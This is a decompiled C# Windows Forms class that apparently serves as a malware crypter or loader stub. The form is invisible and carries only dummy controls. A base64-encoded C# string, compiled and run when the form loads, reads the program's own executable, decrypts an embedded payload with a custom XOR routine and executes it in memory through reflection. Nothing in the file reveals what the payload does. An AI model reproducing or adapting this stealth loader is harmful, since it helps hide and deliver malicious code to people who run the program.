using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ns3;

namespace ns2;

[DesignerGenerated]
internal class Mik : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("RadioButton2")]
	private RadioButton _RadioButton2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox _RichTextBox1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	public static string string_0 = Encoding.Default.GetString(Convert.FromBase64String("dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zOw0KdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQp1c2luZyBTeXN0ZW0uV2luZG93cy5Gb3JtczsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247DQp1c2luZyBTeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnM7DQp1c2luZyBTeXN0ZW0uQ29tcG9uZW50TW9kZWw7DQp1c2luZyBTeXN0ZW0uV2luZG93czsNCnVzaW5nIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHk7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuU2VyaWFsaXphdGlvbi5Gb3JtYXR0ZXJzLkJpbmFyeTsNCg0KDQpuYW1lc3BhY2Ugeg0Kew0KICAgIGNsYXNzIHoNCiAgICB7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKCkNCiAgICAgICAgew0KICAgICAgICAgICAgeSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIHkoKQ0KCQl7DQogICAgICAgICAgICBzdHJpbmcgZmlsID0gRmlsZS5SZWFkQWxsVGV4dChBcHBsaWNhdGlvbi5FeGVjdXRhYmxlUGF0aCk7DQogICAgICAgICAgICBzdHJpbmdbXSBzdHJBcnJheSA9IGZpbC5TcGxpdChuZXcgc3RyaW5nW10geyAiVmZCT0JuUGtqTUhZS09uT1pUIiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuTm9uZSk7DQogICAgICAgICAgICBieXRlW10gZXhlID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKHN0ckFycmF5WzE4XSk7DQoJCQlieXRlW10gZGxsID0gUG9seURlQ3J5cHQoIGV4ZSAsIHN0ckFycmF5WzFdKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgIFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LkxvYWQoZGxsKS5HZXRUeXBlKCJBLkEiKS5HZXRNZXRob2QoIkEiKS5JbnZva2UobnVsbCwgbmV3IG9iamVjdFtdIHsgIH0gKTsNCgkJfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIFBvbHlEZUNyeXB0KGJ5dGVbXSBEYXRhLCBzdHJpbmcgcGFzcykNCnsNCglieXRlW10gS2V5ID0gRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhwYXNzKTsNCglpbnQgaSA9IDA7DQoJZm9yIChpID0gMDsgaSA8PSAoRGF0YS5MZW5ndGggLSAxKSAqICgwICsgMSk7IGkrKykgew0KCQlEYXRhW2kgJSBEYXRhLkxlbmd0aF0gPSBDb252ZXJ0LlRvQnl0ZSgoQ29udmVydC5Ub0ludDMyKERhdGFbaSAlIERhdGEuTGVuZ3RoXSBeIEtleVtpICUgS2V5Lkxlbmd0aF0pIC0gQ29udmVydC5Ub0ludDMyKERhdGFbKGkgKyAxKSAlIERhdGEuTGVuZ3RoXSkgKyAyNTYpICUgMjU2KTsNCgl9DQoJQXJyYXkuUmVzaXplKHJlZiBEYXRhLCBEYXRhLkxlbmd0aCAtIDEpOw0KCXJldHVybiBEYXRhOw0KfQ0KICAgICAgICANCiAgICB9DQp9DQo="));

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox2 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LinkLabel1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual RadioButton RadioButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual RadioButton RadioButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton2 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual RichTextBox RichTextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RichTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RichTextBox1 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual GroupBox GroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox1 = value;
		}
	}

	[DebuggerNonUserCode]
	public Mik()
	{
		((Form)this).add_Load((EventHandler)Mik_Load);
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		lock (list_0)
		{
			if (list_0.Count == list_0.Capacity)
			{
				int num = 0;
				int num2 = list_0.Count - 1;
				int num3 = 0;
				while (true)
				{
					int num4 = num3;
					int num5 = num2;
					if (num4 > num5)
					{
						break;
					}
					WeakReference weakReference = list_0[num3];
					if (weakReference.IsAlive)
					{
						if (num3 != num)
						{
							list_0[num] = list_0[num3];
						}
						num++;
					}
					num3++;
				}
				list_0.RemoveRange(num, list_0.Count - num);
				list_0.Capacity = list_0.Count;
			}
			list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		Button1 = new Button();
		Button2 = new Button();
		CheckBox1 = new CheckBox();
		CheckBox2 = new CheckBox();
		Label1 = new Label();
		Label2 = new Label();
		LinkLabel1 = new LinkLabel();
		ProgressBar1 = new ProgressBar();
		RadioButton1 = new RadioButton();
		RadioButton2 = new RadioButton();
		TextBox1 = new TextBox();
		RichTextBox1 = new RichTextBox();
		Panel1 = new Panel();
		GroupBox1 = new GroupBox();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(343, 51);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button button3 = Button2;
		location = new Point(342, 97);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(1);
		((ButtonBase)Button2).set_Text("Button2");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(173, 282);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(2);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		CheckBox checkBox3 = CheckBox2;
		location = new Point(172, 311);
		((Control)checkBox3).set_Location(location);
		((Control)CheckBox2).set_Name("CheckBox2");
		CheckBox checkBox4 = CheckBox2;
		size = new Size(81, 17);
		((Control)checkBox4).set_Size(size);
		((Control)CheckBox2).set_TabIndex(3);
		((ButtonBase)CheckBox2).set_Text("CheckBox2");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(303, 177);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("Label1");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(300, 205);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(39, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("Label2");
		((Label)LinkLabel1).set_AutoSize(true);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(12, 187);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(59, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(6);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("LinkLabel1");
		ProgressBar progressBar = ProgressBar1;
		location = new Point(23, 255);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(251, 13);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(7);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton radioButton = RadioButton1;
		location = new Point(372, 262);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton2 = RadioButton1;
		size = new Size(90, 17);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton1).set_TabIndex(8);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("RadioButton1");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton2).set_AutoSize(true);
		RadioButton radioButton3 = RadioButton2;
		location = new Point(375, 295);
		((Control)radioButton3).set_Location(location);
		((Control)RadioButton2).set_Name("RadioButton2");
		RadioButton radioButton4 = RadioButton2;
		size = new Size(90, 17);
		((Control)radioButton4).set_Size(size);
		((Control)RadioButton2).set_TabIndex(9);
		RadioButton2.set_TabStop(true);
		((ButtonBase)RadioButton2).set_Text("RadioButton2");
		((ButtonBase)RadioButton2).set_UseVisualStyleBackColor(true);
		TextBox textBox = TextBox1;
		location = new Point(62, 224);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(10);
		RichTextBox richTextBox = RichTextBox1;
		location = new Point(184, 122);
		((Control)richTextBox).set_Location(location);
		((Control)RichTextBox1).set_Name("RichTextBox1");
		RichTextBox richTextBox2 = RichTextBox1;
		size = new Size(100, 96);
		((Control)richTextBox2).set_Size(size);
		((Control)RichTextBox1).set_TabIndex(11);
		RichTextBox1.set_Text("");
		Panel panel = Panel1;
		location = new Point(60, 58);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		size = new Size(200, 100);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(12);
		GroupBox groupBox = GroupBox1;
		location = new Point(368, 151);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		size = new Size(200, 100);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(13);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("GroupBox1");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(318, 39);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)RichTextBox1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)RadioButton2);
		((Control)this).get_Controls().Add((Control)(object)RadioButton1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).set_Name("Mik");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Mik_Load(object sender, EventArgs e)
	{
		Assembly assembly = Class24.smethod_36(string_0);
		Type[] types = assembly.GetTypes();
		foreach (Type type in types)
		{
			if (type.IsClass & type.FullName!.EndsWith(".z"))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
				Class24.smethod_60(type, RuntimeHelpers.GetObjectValue(objectValue));
			}
		}
	}
}
